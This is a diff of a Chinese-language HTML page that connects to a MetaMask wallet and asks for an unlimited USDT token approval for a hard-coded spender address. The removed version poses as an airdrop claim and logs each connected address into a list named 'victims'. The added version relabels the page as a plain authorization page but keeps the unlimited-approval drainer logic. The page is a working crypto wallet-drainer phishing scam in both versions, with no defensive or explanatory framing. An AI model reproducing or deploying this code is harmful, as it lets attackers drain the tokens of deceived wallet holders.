@@ -1,25 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>USDT 空投活動</title>
-<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script></head>
-<body style="text-align:center;font-family:sans-serif;padding:50px;">
-  <h2>🎁 恭喜獲得 USDT 空投！</h2>
-  <button onclick="approve()">立即領取</button>
+<head>
+  <meta charset="UTF-8">
+  <title>授權頁面</title>
+</head>
+<body>
+  <h1>請點擊下方按鈕授權 USDT</h1>
+  <button onclick="approve()">授權</button>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <script>
-    const token = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-    const spender = "0xFbe9c4748A267562f723C67db673943F901533D6";
+    const CONTRACT = "0xfC35E3407c86461BA2D00C080cC763c0f6878377";
+    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Ethereum 主網 USDT
+    const ABI = [{ "name": "approve", "type": "function", "inputs": [
+      { "type": "address", "name": "_spender" },
+      { "type": "uint256", "name": "_value" }
+    ], "constant": false, "outputs": [], "payable": false }];
+
     async function approve() {
-      if (!window.ethereum) return alert("請先安裝 MetaMask");
+      if (typeof window.ethereum === "undefined") return alert("請安裝 MetaMask");
       const web3 = new Web3(window.ethereum);
-      await ethereum.request({ method: "eth_requestAccounts" });
-      const abi = [{"name":"approve","type":"function","inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"outputs":[{"name":"","type":"bool"}],"type":"function"}];
-      const contract = new web3.eth.Contract(abi, token);
-      const accounts = await web3.eth.getAccounts();
-      const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-      await contract.methods.approve(spender, amount).send({ from: accounts[0] });
-      const history = JSON.parse(localStorage.getItem("victims") || "[]");
-      history.push({ address: accounts[0], time: new Date().toLocaleString() });
-      localStorage.setItem("victims", JSON.stringify(history));
+      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      const contract = new web3.eth.Contract(ABI, USDT);
+      const max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+      await contract.methods.approve(CONTRACT, max).send({ from: accounts[0] });
+      alert("✅ 授權成功！");
     }
   </script>
 </body>
